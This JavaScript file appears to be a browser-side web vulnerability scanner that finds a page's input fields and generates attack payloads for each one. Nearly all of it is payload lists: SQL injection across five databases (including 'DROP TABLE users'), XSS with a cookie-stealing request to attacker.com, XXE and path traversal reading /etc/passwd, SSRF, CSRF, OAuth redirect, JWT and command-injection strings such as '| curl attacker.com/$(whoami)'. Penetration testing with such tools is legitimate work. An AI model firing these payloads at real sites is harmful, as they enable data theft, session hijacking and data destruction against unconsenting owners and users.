// Define the function in the global scope
window.scanInputFields = function() {
  console.log('Starting input field scan...');
  const inputFields = document.querySelectorAll('input, textarea, select');
  console.log(`Found ${inputFields.length} input fields`);
  
  const results = [];

  inputFields.forEach(field => {
    try {
      console.log('Processing field:', field);
      
      // Get field name or ID, with fallbacks
      const fieldName = field.name || field.id || field.getAttribute('name') || field.getAttribute('id') || 'unnamed_field';
      const fieldType = field.type || field.tagName.toLowerCase();
      const fieldPlaceholder = field.placeholder || '';
      const fieldValue = field.value || '';
      
      const fieldInfo = {
        fieldName: fieldName,
        fieldType: fieldType,
        fieldId: field.id || 'N/A',
        placeholder: fieldPlaceholder,
        currentValue: fieldValue,
        payloads: generatePayloads(field)
      };
      
      console.log('Generated field info:', fieldInfo);
      results.push(fieldInfo);
    } catch (error) {
      console.error('Error processing field:', error);
    }
  });

  console.log('Scan complete. Results:', results);
  return results;
};

// Define database types and their specific payloads
const DATABASE_TYPES = {
  MYSQL: 'mysql',
  POSTGRESQL: 'postgresql',
  ORACLE: 'oracle',
  MSSQL: 'mssql',
  SQLITE: 'sqlite'
};

function getDatabaseSpecificPayloads(dbType) {
  const payloads = {
    [DATABASE_TYPES.MYSQL]: {
      basic: [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "1' OR '1'='1"
      ],
      union: [
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,user(),database()--",
        "' UNION SELECT table_name,column_name FROM information_schema.columns--"
      ],
      timeBased: [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(10000000,MD5('a'))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
      ],
      errorBased: [
        "' AND ExtractValue(1,CONCAT(0x5c,user()))--",
        "' AND UpdateXML(1,CONCAT(0x5c,user()),1)--"
      ]
    },
    [DATABASE_TYPES.POSTGRESQL]: {
      basic: [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "1' OR '1'='1"
      ],
      union: [
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT version(),current_user,current_database()--",
        "' UNION SELECT table_name,column_name FROM information_schema.columns--"
      ],
      timeBased: [
        "' AND pg_sleep(5)--",
        "' AND (SELECT * FROM (SELECT pg_sleep(5))a)--"
      ],
      errorBased: [
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=CAST((SELECT current_user) AS INT)--"
      ]
    },
    [DATABASE_TYPES.ORACLE]: {
      basic: [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "1' OR '1'='1"
      ],
      union: [
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3 FROM dual--",
        "' UNION SELECT banner, NULL FROM v$version--",
        "' UNION SELECT table_name,column_name FROM all_tab_columns--"
      ],
      timeBased: [
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual))--"
      ],
      errorBased: [
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--"
      ]
    },
    [DATABASE_TYPES.MSSQL]: {
      basic: [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "1' OR '1'='1"
      ],
      union: [
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@version,@@servername,@@language--",
        "' UNION SELECT table_name,column_name FROM information_schema.columns--"
      ],
      timeBased: [
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
        "' AND WAITFOR DELAY '0:0:5'--"
      ],
      errorBased: [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CONVERT(int,(SELECT user))--"
      ]
    },
    [DATABASE_TYPES.SQLITE]: {
      basic: [
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "1' OR '1'='1"
      ],
      union: [
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT sqlite_version(),1,1--",
        "' UNION SELECT name,sql FROM sqlite_master--"
      ],
      timeBased: [
        "' AND randomblob(1000000000)--",
        "' AND (SELECT randomblob(1000000000))--"
      ],
      errorBased: [
        "' AND 1=load_extension('evil.dll')--",
        "' AND 1=abs(randomblob(1000000000))--"
      ]
    }
  };

  return payloads[dbType] || payloads[DATABASE_TYPES.MYSQL]; // Default to MySQL if type not found
}

function generatePayloads(field) {
  console.log('Generating payloads for field:', field);
  const payloads = [];
  const fieldType = field.type.toLowerCase();
  const fieldName = (field.name || field.id || '').toLowerCase();

  // ===== SQL Injection Attacks =====
  if (fieldType === 'text' || fieldType === 'textarea') {
    // Get payloads for each database type
    Object.values(DATABASE_TYPES).forEach(dbType => {
      const dbPayloads = getDatabaseSpecificPayloads(dbType);
      
      // Add database type as comment
      payloads.push(`/* ${dbType.toUpperCase()} */`);
      
      // Add all payloads for this database type
      Object.values(dbPayloads).forEach(category => {
        payloads.push(...category);
      });
    });

    // Additional SQL Injection payloads
    payloads.push("' AND 1=1--");
    payloads.push("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--");
    payloads.push("'; DROP TABLE users--");
    payloads.push("' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file.txt')--");
  }

  // ===== Cross-Site Scripting (XSS) Attacks =====
  if (fieldType === 'text' || fieldType === 'textarea' || fieldType === 'search') {
    // Basic XSS
    payloads.push("<script>alert('XSS')</script>");
    payloads.push("<img src=x onerror=alert('XSS')>");
    payloads.push("javascript:alert('XSS')");
    
    // Reflected XSS
    payloads.push("<svg/onload=alert(1)>");
    payloads.push("\"><img src=x onerror=\"alert(document.domain)\">");
    payloads.push("'><iframe src=\"javascript:alert(1)\"></iframe>");
    payloads.push("1<img src=\"https://tinyurl.com/2p8d95f6\">");
    
    // Stored XSS
    payloads.push("<script>document.write('<img src=\"https://attacker.com/steal?cookie='+document.cookie+'\">')</script>");
    
    // DOM-based XSS
    payloads.push("#<script>alert(1)</script>");
    payloads.push("?param=<script>alert(1)</script>");

    // Additional XSS payloads
    payloads.push("<svg><script>alert(1)</script></svg>");
    payloads.push("data:text/html,<script>alert(1)</script>");
    payloads.push("javascript:alert(1)");
  }

  // ===== JWT Attacks =====
  if (fieldName.includes('token') || fieldName.includes('jwt') || fieldName.includes('auth')) {
    payloads.push('{"alg":"none"}');
    payloads.push('{"alg":"HS256","kid":"../../../dev/null"}');
    payloads.push('{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"..."}}');
    payloads.push('{"alg":"RS256","jku":"https://attacker.com/jwks.json"}');
  }

  // ===== XXE Attacks =====
  if (fieldType === 'text' || fieldType === 'textarea') {
    payloads.push('<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>');
    payloads.push('<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>');
    payloads.push('<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>');
  }

  // ===== SSRF Attacks =====
  if (fieldName.includes('url') || fieldName.includes('endpoint') || fieldName.includes('api')) {
    payloads.push('http://localhost/admin');
    payloads.push('http://192.168.0.1/admin');
    payloads.push('file:///etc/passwd');
    payloads.push('http://attacker.com:80/');
  }

  // ===== CSRF Attacks =====
  if (fieldType === 'text' || fieldType === 'textarea' || fieldType === 'hidden') {
    payloads.push('<form action="https://vulnerable.com/change-email" method="POST">' +
                 '<input type="hidden" name="email" value="attacker@evil.com">' +
                 '</form><script>document.forms[0].submit()</script>');
    payloads.push('<img src="https://vulnerable.com/change-email?email=attacker@evil.com">');
    payloads.push('<script>fetch("https://vulnerable.com/change-email", {' +
                 'method: "POST",' +
                 'body: "email=attacker@evil.com",' +
                 'credentials: "include"' +
                 '})</script>');
  }

  // ===== Clickjacking Attacks =====
  if (fieldName.includes('frame') || fieldName.includes('iframe') || fieldName.includes('embed')) {
    payloads.push('<iframe src="https://vulnerable.com" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>');
    payloads.push('<div style="position:relative;width:500px;height:500px;">' +
                 '<iframe src="https://vulnerable.com" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>' +
                 '<button style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);">Click me!</button>' +
                 '</div>');
  }

  // ===== DOM-based Vulnerabilities =====
  if (fieldType === 'text' || fieldType === 'textarea' || fieldType === 'search') {
    payloads.push('javascript:alert(document.domain)');
    payloads.push('"><img src=x onerror=alert(document.domain)>');
    payloads.push('"><svg onload=alert(document.domain)>');
    payloads.push('"><script>alert(document.domain)</script>');
    payloads.push('"><iframe src=javascript:alert(document.domain)>');
  }

  // ===== CORS Attacks =====
  if (fieldName.includes('origin') || fieldName.includes('header') || fieldName.includes('cors')) {
    payloads.push('https://attacker.com');
    payloads.push('null');
    payloads.push('attacker.com');
    payloads.push('https://attacker.com:443');
    payloads.push('https://attacker.com:80');
  }

  // ===== OAuth Attacks =====
  if (fieldName.includes('oauth') || fieldName.includes('token') || fieldName.includes('auth')) {
    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=token');
    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=code');
    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=id_token');
    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=token%20id_token');
    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=code%20id_token');
  }

  // ===== Path Traversal Attacks =====
  if (fieldName.includes('file') || fieldName.includes('path') || fieldName.includes('directory') || 
      fieldName.includes('location') || fieldName.includes('code')) {
    // Basic Path Traversal
    payloads.push("../../../etc/passwd");
    payloads.push("..\\..\\..\\windows\\system32\\config\\sam");
    payloads.push("../../../../../../../../../../etc/hosts");
    
    // Encoded Path Traversal
    payloads.push("..%2F..%2F..%2Fetc%2Fpasswd");
    payloads.push("..%252F..%252F..%252Fetc%252Fpasswd");
    
    // Location Code Specific
    payloads.push("LOC-../../../etc/passwd");
    payloads.push("LOC-';exec(malicious_code);--");
  }

  // ===== Buffer Overflow Attacks =====
  if (fieldType === 'text' || fieldType === 'textarea') {
    // String-based Overflow
    payloads.push("A".repeat(1000));
    payloads.push("A".repeat(10000));
    payloads.push("A".repeat(100000));
    
    // Numeric Overflow
    payloads.push("2147483647"); // Max 32-bit integer
    payloads.push("-2147483648"); // Min 32-bit integer
    payloads.push("99999999999999999999");
  }

  // ===== Business Logic Attacks =====
  if (fieldName.includes('quantity') || fieldName.includes('count') || fieldName.includes('inventory')) {
    // Inventory Manipulation
    payloads.push("-1");
    payloads.push("999999999");
    payloads.push("0");
    
    // Price Manipulation
    payloads.push("0.01");
    payloads.push("-0.01");
    payloads.push("999999.99");
  }

  // ===== Mobile-Specific Attacks =====
  if (fieldName.includes('url') || fieldName.includes('link') || fieldName.includes('scheme')) {
    // Deep Link Exploitation
    payloads.push("app://cycle-counts/3235?bypass=true");
    payloads.push("intent://cycle-counts/3235#Intent;scheme=app;package=com.example.app;end");
    payloads.push("market://details?id=com.example.app");
    
    // Custom URL Scheme
    payloads.push("myapp://malicious.com");
    payloads.push("intent://malicious.com#Intent;scheme=myapp;package=com.example.app;end");
  }

  // ===== Code Format Testing =====
  if (fieldName.includes('code') || fieldName.includes('id') || fieldName.includes('location')) {
    // Format Validation
    payloads.push("LOC-123");
    payloads.push("LOC-123' OR '1'='1");
    payloads.push("LOC-123' UNION SELECT 1,2,3--");
    payloads.push("LOC-123'><script>alert(1)</script>");
    
    // Pattern Testing
    payloads.push("LOC-12345");
    payloads.push("LOC-ABC123");
    payloads.push("LOC-!@#$%^");
  }

  // ===== Command Injection Attacks =====
  if (fieldName.includes('command') || fieldName.includes('exec') || fieldName.includes('system')) {
    // Basic Command Injection
    payloads.push("; ls -la");
    payloads.push("| cat /etc/passwd");
    payloads.push("`id`");
    
    // Blind Command Injection
    payloads.push("; ping -c 1 attacker.com");
    payloads.push("| curl attacker.com/$(whoami)");
  }

  console.log('Generated payloads:', payloads);
  return payloads;
} 